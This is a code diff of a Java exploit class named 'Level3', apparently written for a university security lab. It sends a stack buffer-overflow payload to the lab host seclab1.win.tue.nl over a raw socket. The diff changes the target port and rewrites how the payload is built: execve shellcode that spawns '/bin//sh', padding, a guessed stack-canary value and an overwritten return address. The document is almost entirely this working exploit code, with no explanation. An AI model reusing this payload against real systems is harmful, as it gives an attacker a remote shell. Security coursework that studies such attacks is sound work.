@@ -7,7 +7,7 @@ import java.net.Socket;
 
 public class Level3 {
 
-    final static private int PORT = 2811;
+    final static private int PORT = 2833;
 
     public static void haxx(int port, byte[] data) throws IOException {
         Socket sock = new Socket("seclab1.win.tue.nl", port);
@@ -46,36 +46,35 @@ public class Level3 {
             (byte) 0x41, (byte) 0xe2, (byte) 0xf8, (byte) 0x52, (byte) 0x68, (byte) 0x6e, (byte) 0x2f, (byte) 0x73, (byte) 0x68, (byte) 0x68, (byte) 0x2f, (byte) 0x2f,
             (byte) 0x62, (byte) 0x69, (byte) 0x89, (byte) 0xe3, (byte) 0x52, (byte) 0x53, (byte) 0x89, (byte) 0xe1, (byte) 0xb0, (byte) 0x0b, (byte) 0xcd, (byte) 0x80
         };
-        final int ptrsize = 4;
-        final int prologueSize = 12;
-        byte[] bbuf = new byte[128 + 1 + ptrsize];
-        for (int i = 0; i < bbuf.length; i++) {
+        int bufSize = 128;
+        int ptrSize = 4;
+        int canary = 4;
+        int overhead = 12;
+        byte[] bbuf = new byte[bufSize + canary + overhead+ptrSize];
+        for (int i = 0; i < bufSize; i++) {
             if (i < shell.length) {
                 bbuf[i] = shell[i];
             } else {
                 bbuf[i] = (byte) i;
-                switch (bbuf[i]) {
-                    case -128:
-                        bbuf[i] = (byte) 0xDE;
-                        break;
-                    case -127:
-                        bbuf[i] = (byte) 0xC0;
-                        break;
-                    case -126:
-                        bbuf[i] = (byte) 0xAD;
-                        break;
-                    case -125:
-                        bbuf[i] = (byte) 0x0B;
-                        break;
-
-                }
             }
         }
-        bbuf[bbuf.length - 1 - ptrsize] = 0x4c;
-        bbuf[bbuf.length + 0 - ptrsize] = (byte) 0xec;
-        bbuf[bbuf.length + 1 - ptrsize] = (byte) 0xff;
-        bbuf[bbuf.length + 2 - ptrsize] = (byte) 0xbf;
-        bbuf[bbuf.length + 3 - ptrsize] = 0;
+        
+        // fill the canary
+        bbuf[bufSize] = (byte) 0xDE;
+        bbuf[bufSize+1] = (byte) 0xC0;
+        bbuf[bufSize+2] = (byte) 0xAD;
+        bbuf[bufSize+3] = (byte) 0x0B;
+        
+        // fill overhead
+        for (int i = 0; i < overhead; i++) {
+            bbuf[bufSize+canary+i] = 1;
+        }
+        
+      // fill the ptr
+        bbuf[bufSize+canary+overhead] = (byte) 0x4c;
+        bbuf[bufSize+canary+overhead+1] = (byte) 0xec;
+        bbuf[bufSize+canary+overhead+2] = (byte) 0xff;
+        bbuf[bufSize+canary+overhead+3] = (byte) 0xbf;
         haxx(PORT, bbuf);
     }
 }
